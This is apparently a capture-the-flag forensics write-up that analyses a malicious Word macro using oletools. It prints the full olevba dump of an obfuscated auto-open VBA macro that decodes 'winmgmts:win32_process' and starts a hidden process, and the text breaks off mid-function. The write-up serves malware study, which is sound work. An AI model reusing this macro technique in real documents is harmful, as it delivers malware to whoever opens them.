# Forensics

## Description

WearRansom ransomware just got loose in our company. The SOC has traced the initial access to a phishing attack, a Word document with macros. Take a look at the document and see if you can find anything else about the malware and perhaps a flag.

## Solution

```bash
└─$ unzip -l emo.zip
Archive:  emo.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   210432  2020-11-02 11:14   emo.doc
---------                     -------
   210432                     1 file
└─$ unzip -P hackthebox ./emo.zip
Archive:  ./emo.zip
  inflating: emo.doc
└─$ oleid emo.doc
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: emo.doc
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description
--------------------+--------------------+----------+--------------------------
File format         |MS Word 97-2003     |info      |
                    |Document or Template|          |
--------------------+--------------------+----------+--------------------------
Container format    |OLE                 |info      |Container type
--------------------+--------------------+----------+--------------------------
Application name    |Microsoft Office    |info      |Application name declared
                    |Word                |          |in properties
--------------------+--------------------+----------+--------------------------
Properties code page|1252: ANSI Latin 1; |info      |Code page used for
                    |Western European    |          |properties
                    |(Windows)           |          |
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                    |                    |          |macros. Suspicious
                    |                    |          |keywords were found. Use
                    |                    |          |olevba and mraptor for
                    |                    |          |more info.
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships
Relationships       |                    |          |such as remote templates,
                    |                    |          |remote OLE objects, etc
--------------------+--------------------+----------+--------------------------
└─$ olevba emo.doc
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.11.9 - http://decalage.info/python/oletools
===============================================================================
FILE: emo.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Dw75ayd2hpcab6.cls
in file: emo.doc - OLE stream: 'Macros/VBA/Dw75ayd2hpcab6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_open()
Get4ipjzmjfvp.X8twf_cydt6
End Sub
Function X4al3i4glox(Gav481k8nh28)
X4al3i4glox = Replace(Gav481k8nh28, "][(s)]w", Sxybmdt069cn)
End Function
-------------------------------------------------------------------------------
VBA MACRO Get4ipjzmjfvp.frm
in file: emo.doc - OLE stream: 'Macros/VBA/Get4ipjzmjfvp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Function X8twf_cydt6()
On Error Resume Next
sss = Dw75ayd2hpcab6.StoryRanges.Item(1)
   Dim LIHXDt(7 + 7 + 1 + 7) As String
Set XaXiEc = (iskkZI)
Dim SnQXASH(7 + 7 + 1 + 8) As String
LIHXDt(tBPnJI) = (Sin(1) + 205 + 6595)
aDLglIF = GXOghGA
LIHXDt(tBPnJI + tBPnJI) = (aOTNpGFFJ + 5)
LIHXDt(tBPnJI + tBPnJI) = 7 + Oct(4) + pNmvqMOzY + CDbl(14) + (4 + LNEEDGz + molmtEGC + Cos(779))
Dim AJfXCG(5 + 6 + 1 + 5) As String
Set dVZiWDFGB = (eQyofECdH)
Dim wmHOBFDQ(5 + 8 + 1 + 6) As String
AJfXCG(LEwdAb) = (Sin(2) + 2 + 4791)
xQZPEUJc = YrnIBGI
AJfXCG(LEwdAb + LEwdAb) = (khBzHCG + 313)
AJfXCG(LEwdAb + LEwdAb) = 7 + Oct(3) + gmIUFwJG + CDbl(8911) + (271 + WwyPDJG + rPLnHwi + Cos(8))
E6qgao74pfq = "][(s" + ")]wro][(s)]w][(s)]wce][(s)]w" + "s][(s)]ws][(s)]w" + Xta0s1qhuxcif8qqi5
   Dim iITzHFPc(7 + 7 + 1 + 6) As String
Set JaxgAAHY = (oRmjC)
Dim XEXOGD(8 + 6 + 1 + 8) As String
iITzHFPc(XHFVEZI) = (Sin(8) + 5 + 8051)
NcVuqJG = WcJYJvH
iITzHFPc(XHFVEZI + XHFVEZI) = (LRdJJHBHD + 8)
iITzHFPc(XHFVEZI + XHFVEZI) = 9894 + Oct(9234) + bCPzCaJIa + CDbl(6) + (1 + fLVlPYdCB + wqYKEBEF + Cos(7119))
Dim DCTECB(6 + 6 + 1 + 4) As String
Set niqpCjFDA = (YCapJCq)
Dim nrNvREE(8 + 6 + 1 + 6) As String
DCTECB(eBMBDA) = (Sin(6) + 865 + 1)
FMpxY = WJKMHJHwg
DCTECB(eBMBDA + eBMBDA) = (QeFoJxC + 45)
DCTECB(eBMBDA + eBMBDA) = 6 + Oct(5) + DJchG + CDbl(78) + (6639 + mULNNfHA + WEkRFDo + Cos(3))
Op93rci3r56v3hsg = "][(s)]w][(s" + ")]w:][(s)]ww][(s)]win][(s)]w][(s)" + "]w3][(s)]w2][(s)]w_][(s)]w" + Jxjv2dzc048yq4alc6
   Dim rhGEXH(6 + 7 + 1 + 5) As String
Set VCutHNpQ = (sbyueQG)
Dim yVnFcAyf(6 + 7 + 1 + 7) As String
rhGEXH(ezhVYCDEH) = (Sin(2711) + 5 + 922)
fQjvIImF = KzxtIH
rhGEXH(ezhVYCDEH + ezhVYCDEH) = (lRdSO + 17)
rhGEXH(ezhVYCDEH + ezhVYCDEH) = 563 + Oct(8519) + omTHCD + CDbl(79) + (4 + EiDDm + jJguE + Cos(8))
Dim ZZtqYtHHF(8 + 6 + 1 + 8) As String
Set AXStgeFJ = (omtPzHDIH)
Dim YXFLBFI(7 + 6 + 1 + 7) As String
ZZtqYtHHF(kfSkHO) = (Sin(28) + 91 + 27)
SJUzsG = sKuFbE
ZZtqYtHHF(kfSkHO + kfSkHO) = (DDxjDP + 9440)
ZZtqYtHHF(kfSkHO + kfSkHO) = 3 + Oct(1914) + JELCJT + CDbl(58) + (1 + QLSVFfyT + MHVlDGdJR + Cos(6))
K8dgvsqr6fhbct6v = "][(s)]w][(s)]ww" + "][(s)]wi][(s)]wnm][(s)]w][(s)]" + "wgm][(s)]wt][(s)]w][(s)]w" + Jeo_8i41vkli6
   Dim YbriYJz(8 + 7 + 1 + 8) As String
Set RbinpE = (OfniM)
Dim TaahYEIJ(8 + 7 + 1 + 5) As String
YbriYJz(OxVPIIKHC) = (Sin(24) + 53 + 7569)
nrhaXCJ = LXNDCgC
YbriYJz(OxVPIIKHC + OxVPIIKHC) = (kKdXMAAFA + 55)
YbriYJz(OxVPIIKHC + OxVPIIKHC) = 17 + Oct(75) + bjZaA + CDbl(1) + (9063 + EoofKVZI + DdzEJ + Cos(65))
Dim hqYtBgCG(7 + 8 + 1 + 5) As String
Set aPFWgHDEC = (mJmdpA)
Dim XfkTuGBtD(8 + 6 + 1 + 8) As String
hqYtBgCG(ZdccFCG) = (Sin(51) + 2586 + 2)
nPdvTG = UosEDIDG
hqYtBgCG(ZdccFCG + ZdccFCG) = (GZuzCBBD + 462)
hqYtBgCG(ZdccFCG + ZdccFCG) = 7 + Oct(9) + eZANoxJEF + CDbl(462) + (1 + UfwtfF + ZqEnBDnz + Cos(7))
Jv2btd64ezie8rdyer = ChrW(wdKeyS)
   Dim IAfgHf(8 + 5 + 1 + 7) As String
Set ySEvH = (dPjSD)
Dim UCKMD(7 + 7 + 1 + 7) As String
IAfgHf(pbkxGAl) = (Sin(64) + 9310 + 36)
jnRKDfHGR = xQCmGFBcQ
IAfgHf(pbkxGAl + pbkxGAl) = (xHITFH + 9)
IAfgHf(pbkxGAl + pbkxGAl) = 9 + Oct(1) + DNCnGH + CDbl(8) + (2 + BAyRTA + vCVpAH + Cos(80))
Dim QcSsG(5 + 7 + 1 + 8) As String
Set bREjDuI = (xpDtBC)
Dim TCPatL(5 + 5 + 1 + 7) As String
QcSsG(MWhDgeFoD) = (Sin(11) + 4 + 970)
yxteyAHjD = pQBvJdCI
QcSsG(MWhDgeFoD + MWhDgeFoD) = (PrLzBhA + 140)
QcSsG(MWhDgeFoD + MWhDgeFoD) = 9 + Oct(3670) + ScqHd + CDbl(4) + (5662 + WovTAEU + WECuD + Cos(131))
Sd0hj_y8cq79n589qq = K8dgvsqr6fhbct6v + Jv2btd64ezie8rdyer + Op93rci3r56v3hsg + Get4ipjzmjfvp.Fwder3b7t4tqrecw + E6qgao74pfq
   Dim eMroy(7 + 8 + 1 + 8) As String
Set sCRHlln = (deZgZAIIJ)
Dim UrkCFaES(5 + 6 + 1 + 4) As String
eMroy(uantLBkI) = (Sin(2) + 6442 + 35)
zfnsDBBHC = HKVVHA
eMroy(uantLBkI + uantLBkI) = (iESFbQ + 40)
eMroy(uantLBkI + uantLBkI) = 68 + Oct(33) + kVLyjryf + CDbl(2) + (9 + BLtWQJ + yqlXFIPe + Cos(253))
Dim BTUuI(6 + 8 + 1 + 6) As String
Set YEYxCnAN = (ESQduGo)
Dim xocsPc(5 + 7 + 1 + 4) As String
BTUuI(mNOZEGRAY) = (Sin(5806) + 7 + 8)
EKqwAQBFb = TGBcB
BTUuI(mNOZEGRAY + mNOZEGRAY) = (rctZzI + 6)
BTUuI(mNOZEGRAY + mNOZEGRAY) = 3 + Oct(7313) + Rjuav + CDbl(5975) + (4 + ZKwHJAC + qtvGJj + Cos(734))
Amst4ijfvo1r0b5ium = I51m0kjl96lpdcfhm(Sd0hj_y8cq79n589qq)
   Dim RAQLJD(7 + 7 + 1 + 6) As String
Set XClJdM = (qlnJCHFGA)
Dim AyphQ(6 + 6 + 1 + 4) As String
RAQLJD(lhsUn) = (Sin(63) + 90 + 209)
QcoqUDJC = FTLUI
RAQLJD(lhsUn + lhsUn) = (KWBRJx + 649)
RAQLJD(lhsUn + lhsUn) = 37 + Oct(9) + kiCVHdO + CDbl(3) + (13 + JVsdIYZ + yWgfDMJ + Cos(1))
Dim cxCnFdBpH(5 + 5 + 1 + 5) As String
Set ouitJA = (BvjvBpF)
Dim irZVSAFEC(6 + 8 + 1 + 7) As String
cxCnFdBpH(WlIOJA) = (Sin(4585) + 7 + 1)
koqBS = lDEQYrNuX
cxCnFdBpH(WlIOJA + WlIOJA) = (RqPWyEUZ + 6)
cxCnFdBpH(WlIOJA + WlIOJA) = 5 + Oct(1694) + UQOJSE + CDbl(451) + (1970 + HNsVvpR + UGJiRH + Cos(677))
Set Rom9dzby5v3unv8 = CreateObject(Amst4ijfvo1r0b5ium)
   Dim xCJYS(8 + 8 + 1 + 4) As String
Set nUxoA = (ndgJxJ)
Dim dNstJJ(7 + 7 + 1 + 6) As String
xCJYS(lIIdsEnz) = (Sin(7) + 21 + 9823)
UqZyGgr = qgKhJhPy
xCJYS(lIIdsEnz + lIIdsEnz) = (KsNJFACB + 3841)
xCJYS(lIIdsEnz + lIIdsEnz) = 3315 + Oct(6099) + UbgTA + CDbl(3) + (2 + lTCbsIsF + GxXWH + Cos(3))
Dim duXHDX(5 + 8 + 1 + 5) As String
Set XAdCCJCDU = (wGHRsBA)
Dim OxZCo(8 + 5 + 1 + 6) As String
duXHDX(nTEhlAA) = (Sin(7) + 760 + 24)
ZXWDXr = vmNyd
duXHDX(nTEhlAA + nTEhlAA) = (NIoXO + 7502)
duXHDX(nTEhlAA + nTEhlAA) = 2 + Oct(7381) + IlwhBGGA + CDbl(64) + (73 + ssIEJuAZ + iumzCPBhV + Cos(9582))
Dbx3w8eu9966odzw7 = Mid(sss, 5, Len(sss))
   Dim iimCF(8 + 8 + 1 + 6) As String
Set cVbUEXH = (qQWMpPjJB)
Dim KbgyWgiy(6 + 8 + 1 + 5) As String
iimCF(ddFjcBZ) = (Sin(5) + 2 + 807)
NNUQCDF = EUOuI
iimCF(ddFjcBZ + ddFjcBZ) = (tliLDA + 73)
iimCF(ddFjcBZ + ddFjcBZ) = 9754 + Oct(684) + qzATa + CDbl(5439) + (3 + tPMKDxGQJ + lPrKBf + Cos(7))
Dim ZIPdEIE(7 + 5 + 1 + 8) As String
Set KhbFIAi = (pGIpm)
Dim QnvQJAvIt(6 + 8 + 1 + 5) As String
ZIPdEIE(dEIgCCLRg) = (Sin(5195) + 1 + 3)
LvpLmB = zhnZcwHAB
ZIPdEIE(dEIgCCLRg + dEIgCCLRg) = (FySxXAIH + 19)
ZIPdEIE(dEIgCCLRg + dEIgCCLRg) = 829 + Oct(214) + TxDmIs + CDbl(195) + (85 + TeLIDpFn + sPwas + Cos(9))
Gav481k8nh28 = Tvjy9j74xspx0wpf + Amst4ijfvo1r0b5ium + Jv2btd64ezie8rdyer + Get4ipjzmjfvp.Mvskm12if9c843w3 + Get4ipjzmjfvp.Cn8r2cg8i626ztt
   Dim CuHWH(5 + 6 + 1 + 8) As String
Set eZjuS = (hlQuF)
Dim lSHDSHO(5 + 5 + 1 + 4) As String
CuHWH(INihXISI) = (Sin(240) + 9382 + 6)
CeToYEFOJ = XhFNDAfH
CuHWH(INihXISI + INihXISI) = (diQIDMTEE + 9)
CuHWH(INihXISI + INihXISI) = 532 + Oct(1) + bSBYAD + CDbl(8) + (54 + dRJBFF + RKhWIioCG + Cos(1))
Dim rBbdCgGID(7 + 7 + 1 + 6) As String
Set CsfsEQDy = (tHWouERF)
Dim MFOOHtBHH(8 + 5 + 1 + 6) As String
rBbdCgGID(ZBEbaY) = (Sin(14) + 818 + 1)
xmcvJAB = unjRC
rBbdCgGID(ZBEbaY + ZBEbaY) = (hZKtHDYG + 2163)
rBbdCgGID(ZBEbaY + ZBEbaY) = 202 + Oct(2) + kxieI + CDbl(75) + (9 + VktznpCDE + xUImPFBRx + Cos(949))
Set Nzkctvs5ewy_ds = Iwfbtu1s0d782jz(Gav481k8nh28 + Get4ipjzmjfvp.Fwder3b7t4tqrecw)
   Dim uysVZGLE(6 + 7 + 1 + 8) As String
Set HrmgKC = (yFUaERwnM)
Dim DCXgo(6 + 7 + 1 + 7) As String
uysVZGLE(VODRro) = (Sin(5) + 5 + 7)
nADlCW = DxupENAFA
uysVZGLE(VODRro + VODRro) = (kYUTCCm + 8672)
uysVZGLE(VODRro + VODRro) = 486 + Oct(547) + wFXADzAJJ + CDbl(75) + (8 + EcWkCBWH + wjhXAJF + Cos(7))
Dim dhVACDD(6 + 7 + 1 + 6) As String
Set soSvHK = (wKOSWHJ)
Dim qUyfy(7 + 5 + 1 + 5) As String
dhVACDD(LfyOFtG) = (Sin(30) + 4 + 254)
nyhPC = QpscekG
dhVACDD(LfyOFtG + LfyOFtG) = (lzcwGnM + 17)
dhVACDD(LfyOFtG + LfyOFtG) = 9 + Oct(86) + cIngGbFIE + CDbl(38) + (1 + eznxDGC + WPWWJDJ + Cos(6))
   Dim tuGlEMNUH(6 + 8 + 1 + 8) As String
Set pFgxtjm = (PTyGIAEHE)
Dim hullICDx(8 + 6 + 1 + 5) As String
tuGlEMNUH(akUPoTFvY) = (Sin(1474) + 8 + 819)
KpZdJ = lYvceWGew
tuGlEMNUH(akUPoTFvY + akUPoTFvY) = (fBhoIR + 4)
tuGlEMNUH(akUPoTFvY + akUPoTFvY) = 56 + Oct(3031) + GTYmh + CDbl(5) + (27 + yqAQE + aIkGEC + Cos(258))
Dim KgVqvF(7 + 7 + 1 + 4) As String
Set dyYfmEW = (euDCT)
Dim ZFRdGCtu(7 + 6 + 1 + 7) As String
KgVqvF(HmjZbHGBE) = (Sin(5) + 7 + 3)
FBCpGGZJ = pMeqBMo
KgVqvF(HmjZbHGBE + HmjZbHGBE) = (bdxXMNBG + 6)
KgVqvF(HmjZbHGBE + HmjZbHGBE) = 9 + Oct(95) + QOBnPkFc + CDbl(13) + (114 + kyBDET + MlSxCzI + Cos(1))
   Dim crVtKHQWB(5 + 6 + 1 + 5) As String
Set zdGjPIC = (kUBBICmD)
Dim EBxxC(6 + 7 + 1 + 8) As String
crVtKHQWB(lUoRYN) = (Sin(587) + 435 + 8)
EwbcHIpDH = QJVOHPEF
crVtKHQWB(lUoRYN + lUoRYN) = (gfcPAE + 13)
crVtKHQWB(lUoRYN + lUoRYN) = 31 + Oct(1851) + mqutET + CDbl(164) + (73 + wotoAG + QNruXSC + Cos(6))
Dim YRgECF(8 + 7 + 1 + 7) As String
Set jrSuN = (asSvxGC)
Dim jmlTEGEHD(8 + 5 + 1 + 6) As String
YRgECF(rsLfMDHRI) = (Sin(1234) + 871 + 601)
urCBGDI = LPZGqW
YRgECF(rsLfMDHRI + rsLfMDHRI) = (WKBwIIx + 80)
YRgECF(rsLfMDHRI + rsLfMDHRI) = 8819 + Oct(158) + irqNf + CDbl(5) + (9 + SsmqieBVT + kFfqC + Cos(526))
Rom9dzby5v3unv8. _
Create AWLDFu7C7y(I51m0kjl96lpdcfhm(Dbx3w8eu9966odzw7)), Kw8r40ymn9ne3xu, Nzkctvs5ewy_ds
   Dim CpULFB(5 + 5 + 1 + 7) As String
Set axAfIEGRA = (QROQHnVJ)
Dim QHdoB(8 + 5 + 1 + 5) As String
CpULFB(TrBpFI) = (Sin(8) + 657 + 23)
xSnpcJCH = gtlfI
CpULFB(TrBpFI + TrBpFI) = (lsdYGbJFn + 638)
CpULFB(TrBpFI + TrBpFI) = 9806 + Oct(724) + uHfXN + CDbl(932) + (7 + sbFHIIArH + sxbtG + Cos(28))
Dim usrCDU(8 + 8 + 1 + 4) As String
Set sHuwpJH = (gWJfc)
Dim YxEfjGJ(5 + 8 + 1 + 4) As String
usrCDU(WMDxGNE) = (Sin(7) + 742 + 600)
DvEdpD = tvUMTQF
usrCDU(WMDxGNE + WMDxGNE) = (ybnwoB + 4617)
usrCDU(WMDxGNE + WMDxGNE) = 789 + Oct(98) + RkTnG + CDbl(3) + (4 + GyKLzEF + NLKIdFC + Cos(3))
   Dim fvJsBBDU(5 + 6 + 1 + 5) As String
Set dmUGJtEIO = (uydmCpg)
Dim FclRuzDG(5 + 8 + 1 + 6) As String
fvJsBBDU(HymnRVRE) = (Sin(6) + 37 + 3598)
YkQZHhJH = WpwcG
fvJsBBDU(HymnRVRE + HymnRVRE) = (qljYKHo + 385)
fvJsBBDU(HymnRVRE + HymnRVRE) = 3 + Oct(3) + xrYfDFtK + CDbl(5) + (89 + hIjOfJ + RPNhCwDC + Cos(6))
Dim qQldIhoCE(8 + 8 + 1 + 5) As String
Set rHlNGA = (xOzmLO)
Dim pNdhI(5 + 6 + 1 + 6) As String
qQldIhoCE(loWUokjFC) = (Sin(9987) + 2 + 220)
RvbYFFAfH = IUzlJJ
qQldIhoCE(loWUokjFC + loWUokjFC) = (etSoIE + 1)
qQldIhoCE(loWUokjFC + loWUokjFC) = 57 + Oct(3) + PrkTCejb + CDbl(207) + (8 + MRAMjOPB + uGpbAu + Cos(9740))
End Function
Function Iwfbtu1s0d782jz(Wvnulte_7rd74l873)
On Error Resume Next
   Dim ouUhFGIGf(5 + 7 + 1 + 5) As String
Set RlxSfHAYF = (JDFYIEIER)
Dim NAFGBBt(7 + 6 + 1 + 5) As String
ouUhFGIGf(VvufD) = (Sin(1912) + 9 + 32)
aLEvBtsA = yiBOhGPHC
ouUhFGIGf(VvufD + VvufD) = (SpCZJgIbx + 1)
ouUhFGIGf(VvufD + VvufD) = 47 + Oct(2) + JKDmHJ + CDbl(5) + (3 + ycwsIG + xFozEoBTm + Cos(4))
Dim vfVAC(7 + 7 + 1 + 7) As String
Set kWFWBISu = (FtcKEFcG)
Dim zPozC(7 + 7 + 1 + 8) As String
vfVAC(XSBMFAXy) = (Sin(5) + 7 + 804)
faeGBD = QiOaCJf
vfVAC(XSBMFAXy + XSBMFAXy) = (uOKtFrCB + 60)
vfVAC(XSBMFAXy + XSBMFAXy) = 1 + Oct(505) + kOXeC + CDbl(8) + (9 + ZxfmTDAmT + DMLyG + Cos(9))
Set Iwfbtu1s0d782jz = Rk3572j7tam4v8.Y5ruq1pwxek1348fi(I51m0kjl96lpdcfhm(A1h3yevqvs8 + Wvnulte_7rd74l873 + Hkhlqz9x9h9xvlv))
   Dim eMynDvEG(7 + 8 + 1 + 4) As String
Set bosZTe = (ZHQRDVvED)
Dim SCxUDgXHF(7 + 7 + 1 + 6) As String
eMynDvEG(qsaqdCD) = (Sin(481) + 2486 + 61)
KNHer = DzVJD
eMynDvEG(qsaqdCD + qsaqdCD) = (QVKICAHGC + 1)
eMynDvEG(qsaqdCD + qsaqdCD) = 63 + Oct(843) + rhVSHHA + CDbl(1) + (1840 + FDakJyDA + ZdugFEBSS + Cos(6))
Dim hblBI(8 + 6 + 1 + 4) As String
Set cRTStDFB = (jzfrAO)
Dim lDyKI(7 + 5 + 1 + 6) As String
hblBI(xRdCB) = (Sin(10) + 9219 + 9)
rNbDIAUS = tmRgDDGE
hblBI(xRdCB + xRdCB) = (oVNifh + 9)
hblBI(xRdCB + xRdCB) = 9 + Oct(79) + lClHEe + CDbl(115) + (688 + VbMPGQ + rqzDD + Cos(1))
Iwfbtu1s0d782jz.XSize = 0
Iwfbtu1s0d782jz.YSize = 0
   Dim fRjdFCIm(6 + 5 + 1 + 8) As String
Set yMhIFMGD = (kkoDI)
Dim mRxAL(8 + 6 + 1 + 4) As String
fRjdFCIm(XhxlCSmJE) = (Sin(46) + 8 + 484)
ocTFGCAM = ZNLRD
fRjdFCIm(XhxlCSmJE + XhxlCSmJE) = (xpdUDHB + 8)
fRjdFCIm(XhxlCSmJE + XhxlCSmJE) = 1 + Oct(36) + phOaIiI + CDbl(6) + (5 + fimLiVBCE + irpLx + Cos(4))
Dim POgWDiUG(6 + 7 + 1 + 8) As String
Set aZZkJIA = (zxAAItq)
Dim PoLDI(5 + 8 + 1 + 6) As String
POgWDiUG(qBxkBh) = (Sin(7745) + 80 + 289)
ZZaOlHYa = UsWoBEn
POgWDiUG(qBxkBh + qBxkBh) = (OlOXGbk + 1)
POgWDiUG(qBxkBh + qBxkBh) = 8870 + Oct(5) + lnibY + CDbl(46) + (570 + fOpUYSC + VZimy + Cos(329))
End Function
Function I51m0kjl96lpdcfhm(St7625txnot)
On Error Resume Next
   Dim nIMomJ(7 + 5 + 1 + 8) As String
Set mwiaJCwY = (LvplXHH)
Dim bCxOZBGJR(6 + 6 + 1 + 8) As String
nIMomJ(lQahnH) = (Sin(2) + 29 + 904)
XwJoHQ = swDDEHEDy
nIMomJ(lQahnH + lQahnH) = (GQkQDQf + 9)
nIMomJ(lQahnH + lQahnH) = 20 + Oct(3) + tATQD + CDbl(66) + (82 + DHKVEjKIS + UBGVGJDD + Cos(8048))
Dim FkCoHp(8 + 7 + 1 + 4) As String
Set fNdLD = (lXCHyAEv)
Dim ZNsIEB(5 + 5 + 1 + 6) As String
FkCoHp(LSiwbWHo) = (Sin(493) + 778 + 25)
SqrRClQBm = jZAcJp
FkCoHp(LSiwbWHo + LSiwbWHo) = (ScUjHHSkX + 6)
FkCoHp(LSiwbWHo + LSiwbWHo) = 66 + Oct(6) + ZWRjGgE + CDbl(280) + (8 + kbqbLIIH + RxjoHFC + Cos(9))
Swa7jh9qx56op58nf = (St7625txnot)
   Dim UmkRIEu(5 + 6 + 1 + 8) As String
Set jYQSjI = (JVnNDbnpC)
Dim ZWgajTo(7 + 7 + 1 + 7) As String
UmkRIEu(okgKdGCG) = (Sin(822) + 3 + 3)
wzVsH = bPaVhJDH
UmkRIEu(okgKdGCG + okgKdGCG) = (LCaMAWCHk + 934)
UmkRIEu(okgKdGCG + okgKdGCG) = 9047 + Oct(2543) + XuuEfCwWA + CDbl(7) + (9 + TFDpDAx + TpHsk + Cos(2))
Dim qwjsHJcH(7 + 5 + 1 + 7) As String
Set bjNVAA = (ymTUHIABF)
Dim XrdSyMG(8 + 5 + 1 + 8) As String
qwjsHJcH(sxcyGH) = (Sin(697) + 928 + 7)
VRTbBsA = TpZMxj
qwjsHJcH(sxcyGH + sxcyGH) = (BUIACDGtC + 9)
qwjsHJcH(sxcyGH + sxcyGH) = 3 + Oct(3493) + iFRnr + CDbl(3) + (8 + ShbgyJGE + luZZRJ + Cos(78))
Sxhaen2_r4b3crptm = Dw75ayd2hpcab6.X4al3i4glox(Swa7jh9qx56op58nf)
   Dim kdscDErj(7 + 6 + 1 + 4) As String
Set aFfpGp = (hjRTZNDGJ)
Dim zqVkuHu(6 + 7 + 1 + 6) As String
kdscDErj(BElQC) = (Sin(5) + 6 + 354)
SZbrtCp = qZHeJAD
kdscDErj(BElQC + BElQC) = (inMTLGJ + 5)
kdscDErj(BElQC + BElQC) = 86 + Oct(93) + RtKSEXETs + CDbl(237) + (2 + dwBsFG + MOwHB + Cos(2))
Dim rHyLrgvAP(6 + 8 + 1 + 6) As String
Set lscaa = (qlYFWCFA)
Dim gbwak(6 + 8 + 1 + 5) As String
rHyLrgvAP(QpIaAorpF) = (Sin(512) + 8702 + 83)
FmoXED = RQQNg
rHyLrgvAP(QpIaAorpF + QpIaAorpF) = (TTSBDUcC + 3)
rHyLrgvAP(QpIaAorpF + QpIaAorpF) = 5 + Oct(4) + iThYS + CDbl(3) + (5510 + TtcmHO + KPifuU + Cos(846))
I51m0kjl96lpdcfhm = Sxhaen2_r4b3crptm
   Dim blXJIk(6 + 5 + 1 + 8) As String
Set rqhtP = (lOtlxlA)
Dim aQkjA(6 + 8 + 1 + 4) As String
blXJIk(KWpQoCS) = (Sin(8) + 3 + 250)
fLSrFg = VAfNIJ
blXJIk(KWpQoCS + KWpQoCS) = (YkcHHEu + 8)
blXJIk(KWpQoCS + KWpQoCS) = 3 + Oct(6) + sDzaU + CDbl(6) + (1491 + zzzqCZHH + RERUEDBAD + Cos(3))
Dim qpTXy(5 + 5 + 1 + 8) As String
Set mOTdDDIJ = (vWqBlKEj)
Dim kvQxfB(5 + 8 + 1 + 6) As String
qpTXy(krBPlqzJ) = (Sin(84) + 186 + 6)
RCDZe = FyehtVb
qpTXy(krBPlqzJ + krBPlqzJ) = (WiRYhFfQ + 2144)
qpTXy(krBPlqzJ + krBPlqzJ) = 13 + Oct(1) + oyRjRH + CDbl(8) + (7 + WzEZBS + caPLFkOJl + Cos(5822))
End Function
Function T34b0j5rffcr(Ny676u98ho9ja)
Xlcdcd2bzdz8f4 = Pgmtj98xbz1mkec2y
End Function
Function AWLDFu7C7y(AMUjF5h4uz)
On Error Resume Next
Dim qpTXy(5 + 5 + 1 + 8) As String
Dim kvQxfB(5 + 8 + 1 + 6) As String
qpTXy(krBPlqzJ) = (Sin(84) + 186 + 6)
RCDZe = FyehtVb
qpTXy(krBPlqzJ + krBPlqzJ) = (WiRYhFfQ + 2144)
qpTXy(krBPlqzJ + krBPlqzJ) = 13 + Oct(1) + oyRjRH + CDbl(8) + (7 + WzEZBS + caPLFkOJl + Cos(5822))
AWLDFu7C7y = Mid(AMUjF5h4uz, 1, 50)
Dim UmkRIEu(5 + 6 + 1 + 8) As String
Set jYQSjI = (JVnNDbnpC)
Dim ZWgajTo(7 + 7 + 1 + 7) As String
UmkRIEu(okgKdGCG) = (Sin(822) + 3 + 3)
wzVsH = bPaVhJDH
UmkRIEu(okgKdGCG + okgKdGCG) = (LCaMAWCHk + 934)
UmkRIEu(okgKdGCG + okgKdGCG) = 9047 + Oct(2543) + XuuEfCwWA + CDbl(7) + (9 + TFDpDAx + TpHsk + Cos(2))
For i = 51 To Len(AMUjF5h4uz) Step 2
Dim dhVACDD(6 + 7 + 1 + 6) As String
Set soSvHK = (wKOSWHJ)
AWLDFu7C7y = AWLDFu7C7y & Mid(AMUjF5h4uz, i, 1)
Dim qUyfy(7 + 5 + 1 + 5) As String
dhVACDD(LfyOFtG) = (Sin(30) + 4 + 254)
nyhPC = QpscekG
dhVACDD(LfyOFtG + LfyOFtG) = (lzcwGnM + 17)
dhVACDD(LfyOFtG + LfyOFtG) = 9 + Oct(86) + cIngGbFIE + CDbl(38) + (1 + eznxDGC + WPWWJDJ + Cos(6))
Next i
Dim IAfgHf(8 + 5 + 1 + 7) As String
Set ySEvH = (dPjSD)
Dim UCKMD(7 + 7 + 1 + 7) As String
IAfgHf(pbkxGAl) = (Sin(64) + 9310 + 36)
jnRKDfHGR = xQCmGFBcQ
IAfgHf(pbkxGAl + pbkxGAl) = (xHITFH + 9)
IAfgHf(pbkxGAl + pbkxGAl) = 9 + Oct(1) + DNCnGH + CDbl(8) + (2 + BAyRTA + vCVpAH + Cos(80))
Dim QcSsG(5 + 7 + 1 + 8) As String
Set bREjDuI = (xpDtBC)
Dim TCPatL(5 + 5 + 1 + 7) As String
QcSsG(MWhDgeFoD) = (Sin(11) + 4 + 970)
yxteyAHjD = pQBvJdCI
QcSsG(MWhDgeFoD + MWhDgeFoD) = (PrLzBhA + 140)
QcSsG(MWhDgeFoD + MWhDgeFoD) = 9 + Oct(3670) + ScqHd + CDbl(4) + (5662 + WovTAEU + WECuD + Cos(131))
End Function
-------------------------------------------------------------------------------
VBA MACRO Rk3572j7tam4v8.bas
in file: emo.doc - OLE stream: 'Macros/VBA/Rk3572j7tam4v8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Function Y5ruq1pwxek1348fi(Hy5393z_cu1)
On Error Resume Next
   Dim TAKBR(6 + 7 + 1 + 5) As String
Set ivvpvBW = (yWAMfE)
Dim rkcHF(5 + 6 + 1 + 6) As String
TAKBR(ksEsBaCtA) = (Sin(1897) + 5881 + 6)
ZOmZFY = UovwGH
TAKBR(ksEsBaCtA + ksEsBaCtA) = (jHUdBB + 44)
TAKBR(ksEsBaCtA + ksEsBaCtA) = 6 + Oct(116) + YSVfIA + CDbl(6) + (6 + MakkGA + qhhoEEA + Cos(5))
Dim ojnIHCE(7 + 5 + 1 + 7) As String
Set UuAPGAfFH = (jdxSsGH)
Dim BctfKqn(6 + 8 + 1 + 5) As String
